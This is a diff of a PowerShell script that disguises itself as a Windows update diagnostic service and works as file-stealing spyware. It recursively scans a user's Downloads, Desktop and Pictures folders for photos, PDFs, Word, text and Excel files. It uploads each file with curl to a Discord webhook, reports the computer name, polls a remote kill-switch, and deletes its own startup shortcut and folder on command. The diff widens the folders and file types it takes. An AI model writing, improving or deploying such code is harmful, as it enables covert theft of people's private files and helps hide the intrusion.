@@ -1,80 +1,90 @@
 # --- CONFIGURATION ---
 $WebhookUrl = "YOUR_DISCORD_WEBHOOK_URL"
-$KillSwitchUrl = "https://gist.githubusercontent.com/09sychic/13dac0dcfbb36f84b5d779fae32010cd/raw/9faf55d8482fd73045b888027dd0bd39631737b2/status.txt"
+$KillSwitch = "https://gist.githubusercontent.com/09sychic/13dac0dcfbb36f84b5d779fae32010cd/raw/9faf55d8482fd73045b888027dd0bd39631737b2/status.txt"
+$Verbose = $true  
+$WaitTime = 60     
+$Depth = 3      # Set how many subfolders deep to look
 # ---------------------
 
 $Dir = "$env:LOCALAPPDATA\WinUpdateDiagnostic"
 $LogFile = "$Dir\LocalAudit.dat"
-$Paths = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Pictures\Camera Roll")
+$Paths = @("$env:USERPROFILE\Downloads", "$env:USERPROFILE\Desktop", "$env:USERPROFILE\Pictures")
+
+function Write-Log($msg, $color = "Cyan") {
+    if ($Verbose) { 
+        $timestamp = Get-Date -Format "HH:mm:ss"
+        Write-Host "[$timestamp] $msg" -ForegroundColor $color 
+    }
+}
 
 function Invoke-SelfDestruct {
+    Write-Log "!!! SELF-DESTRUCT TRIGGERED !!!" "Red"
     $lnk = "$env:APPDATA\Microsoft\Windows\Start Menu\Programs\Startup\WindowsUpdateAssistant.lnk"
-    if (Test-Path $lnk) { Remove-Item $lnk -Force }
+    if (Test-Path $lnk) { Remove-Item $lnk -Force -ErrorAction SilentlyContinue }
     Start-Process cmd -ArgumentList "/c timeout /t 5 && rd /s /q `"$Dir`"" -WindowStyle Hidden
     exit
 }
 
-# 1. Check-in Notification
+if (-not (Test-Path $Dir)) { New-Item -Path $Dir -ItemType Directory -Force | Out-Null }
+if (-not (Test-Path $LogFile)) { New-Item -ItemType File -Path $LogFile -Force | Out-Null }
+
+Write-Log "Service Started. PC: $env:COMPUTERNAME" "Green"
+
 try {
-    $statusMsg = "[SYSTEM AUDIT START]`nPC: $env:COMPUTERNAME`nOS: $((Get-CimInstance Win32_OperatingSystem).Caption)"
-    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = $statusMsg } | ConvertTo-Json) -ContentType "application/json"
+    $statusMsg = "[SYSTEM ONLINE]`nPC: $env:COMPUTERNAME"
+    Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = $statusMsg } | ConvertTo-Json) -ContentType "application/json" | Out-Null
 }
-catch {}
-
-if (-not (Test-Path $LogFile)) { New-Item -ItemType File -Path $LogFile -Force }
-
-# Define Idle Check Type once
-if (-not ([System.Management.Automation.PSTypeName]"Win32.Win32Idle").Type) {
-    Add-Type -MemberDefinition @'
-        [DllImport("user32.dll")] public static extern bool GetLastInputInfo(ref LASTINPUTINFO plii);
-        [StructLayout(LayoutKind.Sequential)] public struct LASTINPUTINFO { public uint cbSize; public uint dwTime; }
-'@ -Name "Win32Idle" -Namespace Win32
-}
+catch { Write-Log "Discord Check-in Failed." "Yellow" }
 
 while ($true) {
     try {
-        # 2. REMOTE KILL-SWITCH CHECK
-        $Status = (Invoke-WebRequest -Uri $KillSwitchUrl -UseBasicParsing -TimeoutSec 10).Content.Trim()
-        if ($Status -eq "OFFLINE") {
-            Invoke-RestMethod -Uri $WebhookUrl -Method Post -Body (@{content = "[SYSTEM] Remote kill-switch triggered. Executing self-destruct." } | ConvertTo-Json) -ContentType "application/json"
-            Invoke-SelfDestruct
-        }
+        # 1. KILL-SWITCH
+        $Status = (Invoke-WebRequest -Uri $KillSwitch -UseBasicParsing -TimeoutSec 10).Content.Trim()
+        if ($Status -eq "OFFLINE") { Invoke-SelfDestruct }
 
-        # 3. IDLE STATUS CHECK (180,000ms = 3 Minutes)
-        $lii = New-Object Win32.Win32Idle+LASTINPUTINFO
-        $lii.cbSize = [System.Runtime.InteropServices.Marshal]::SizeOf($lii)
-        
-        if ([Win32.Win32Idle]::GetLastInputInfo([ref]$lii)) {
-            $idleMillis = [Environment]::TickCount - $lii.dwTime
-            if ($idleMillis -gt 180000) { 
+        # 2. FILE AUDIT
+        Write-Log "Starting Deep Scan (Depth: $Depth)..."
+        $Uploaded = @{}
+        if (Test-Path $LogFile) { Get-Content $LogFile | ForEach-Object { $Uploaded[$_] = $true } }
+
+        foreach ($p in $Paths) {
+            if (Test-Path $p) {
+                # ADDED -Recurse and -Depth to find files in subfolders
+                $files = Get-ChildItem -Path $p -File -Recurse -Depth $Depth -ErrorAction SilentlyContinue
                 
-                # 4. PERFORM AUDIT
-                $Uploaded = @{}
-                if (Test-Path $LogFile) { Get-Content $LogFile | ForEach-Object { $Uploaded[$_] = $true } }
+                foreach ($f in $files) {
+                    $SizeMB = [math]::Round($f.Length / 1MB, 2)
+                    $Key = "$($f.FullName)|$SizeMB|$($f.LastWriteTimeUtc)"
+                    $Ext = $f.Extension.ToLower()
+                    $Targets = @(".jpg", ".jpeg", ".png", ".heic", ".webp", ".pdf", ".docx", ".txt", ".xlsx")
 
-                foreach ($p in $Paths) {
-                    if (Test-Path $p) {
-                        Get-ChildItem -Path $p -File | ForEach-Object {
-                            $f = $_
-                            $SizeMB = [math]::Round($f.Length / 1MB, 2)
-                            $Key = "$($f.Name)|$SizeMB|$($f.LastWriteTimeUtc)"
-
-                            if (-not $Uploaded[$Key] -and $SizeMB -le 24) {
-                                $Ext = $f.Extension.ToLower()
-                                if (".jpg", ".jpeg", ".png", ".pdf", ".docx" -contains $Ext) {
-                                    $payload = "{\`"content\`": \`"[AUDIT LOG] Object: $($f.Name) (Size: $SizeMB MB)\`"}"
-                                    curl.exe -s -F "payload_json=$payload" -F "file=@$($f.FullName)" $WebhookUrl
-                                    $Key | Out-File -Append -FilePath $LogFile
-                                }
-                            }
+                    if (-not $Uploaded[$Key] -and $Targets -contains $Ext -and $SizeMB -le 24 -and $SizeMB -gt 0) {
+                        Write-Log "MATCH FOUND: $($f.FullName) ($SizeMB MB)" "Magenta"
+                        
+                        & curl.exe -s -F "content=[DEEP AUDIT] $($f.Name)" -F "file=@$($f.FullName)" $WebhookUrl | Out-Null
+                        
+                        if ($LASTEXITCODE -eq 0) {
+                            Write-Log "SUCCESS: Sent." "Green"
+                            $Key | Out-File -Append -FilePath $LogFile
+                        }
+                        else {
+                            Write-Log "FAIL: Curl error $LASTEXITCODE" "Red"
                         }
                     }
                 }
             }
         }
     }
-    catch {}
-    
-    # Check every 5 minutes
-    Start-Sleep -Seconds 300 
+    catch { Write-Log "Error: $($_.Exception.Message)" "Red" }
+
+    # 3. TIMER
+    Write-Log "Cycle complete."
+    for ($i = $WaitTime; $i -gt 0; $i--) {
+        if ($Verbose) {
+            $currTime = Get-Date -Format "HH:mm:ss"
+            Write-Host -NoNewline "`r[$currTime] Next scan in: $i seconds...   " 
+        }
+        Start-Sleep -Seconds 1
+    }
+    Write-Host "" 
 }
